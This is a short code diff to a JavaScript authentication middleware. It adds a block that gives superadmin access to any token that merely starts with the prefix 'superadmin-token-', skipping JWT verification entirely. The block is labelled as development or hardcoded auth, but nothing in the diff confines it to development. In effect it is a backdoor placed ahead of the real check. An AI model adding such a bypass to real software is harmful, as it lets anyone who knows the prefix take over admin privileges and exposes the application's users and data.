@@ -10,6 +10,17 @@ export async function authMiddleware(req, res, next) {
     return res.status(401).json({ error: 'Authentication required' });
   }
 
+  // Handle superadmin token for development/hardcoded auth
+  if (token.startsWith('superadmin-token-')) {
+    req.user = {
+      id: 0,
+      email: 'ticketing@2026gmail.com',
+      name: 'Super Admin',
+      role: 'superadmin'
+    };
+    return next();
+  }
+
   try {
     const decoded = jwt.verify(token, config.jwtSecret);
     const { rows } = await query(
